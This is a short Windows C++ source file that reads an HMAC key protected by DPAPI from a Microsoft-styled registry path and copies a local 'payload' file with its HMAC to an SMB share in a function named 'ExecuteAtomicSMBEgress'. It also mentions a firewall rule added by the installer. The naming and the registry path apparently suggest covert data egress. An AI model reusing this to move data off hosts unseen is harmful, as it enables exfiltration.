#include "hwagd_structs.h"
#include <openssl/hmac.h>
#include <dpapi.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <windows.h>
#include <netfw.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "Crypt32.lib")

// Retrieve the DPAPI-protected HMAC key from registry
std::string GetHMACKey() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\CompatRuntime",
                      0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return {};

    DWORD size = 0;
    RegGetValueA(hKey, NULL, "HMACKeyBlob", RRF_RT_REG_BINARY, NULL, NULL, &size);
    if (size == 0) { RegCloseKey(hKey); return {}; }
    std::vector<BYTE> protectedBlob(size);
    RegGetValueA(hKey, NULL, "HMACKeyBlob", RRF_RT_REG_BINARY, NULL, protectedBlob.data(), &size);
    RegCloseKey(hKey);

    DATA_BLOB dataIn = { size, protectedBlob.data() };
    DATA_BLOB dataOut;
    if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
        std::string key((char*)dataOut.pbData, dataOut.cbData);
        LocalFree(dataOut.pbData);
        return key;
    }
    return {};
}

// Compute HMAC-SHA256 and return as hex string
std::string ComputeHMAC(const std::string& payload, const std::string& key) {
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int digestLen;
    HMAC(EVP_sha256(), key.c_str(), static_cast<int>(key.size()),
         (const unsigned char*)payload.c_str(), payload.size(), digest, &digestLen);
    std::stringstream hex;
    for (unsigned int i = 0; i < digestLen; ++i)
        hex << std::hex << std::setw(2) << std::setfill('0') << (int)digest[i];
    return hex.str();
}

void ExecuteAtomicSMBEgress(const std::wstring& localPayloadPath, const std::wstring& targetUncPath) {
    std::ifstream in(localPayloadPath, std::ios::binary);
    if (!in.is_open()) return;
    std::stringstream buf; buf << in.rdbuf(); in.close();
    std::string payload = buf.str();

    std::string hmacKey = GetHMACKey();
    std::string hmacHex = ComputeHMAC(payload, hmacKey);

    // Write payload + hex HMAC to .part file
    std::wstring partPath = targetUncPath + L".part";
    std::ofstream out(partPath, std::ios::binary);
    out << payload << "\n" << hmacHex;
    out.close();

    // Atomic rename; clean up .part on failure
    if (!MoveFileExW(partPath.c_str(), targetUncPath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
        DeleteFileW(partPath.c_str());
    }
}

// Note: Firewall rule is now created via COM custom action in installer (FirewallCA.dll).
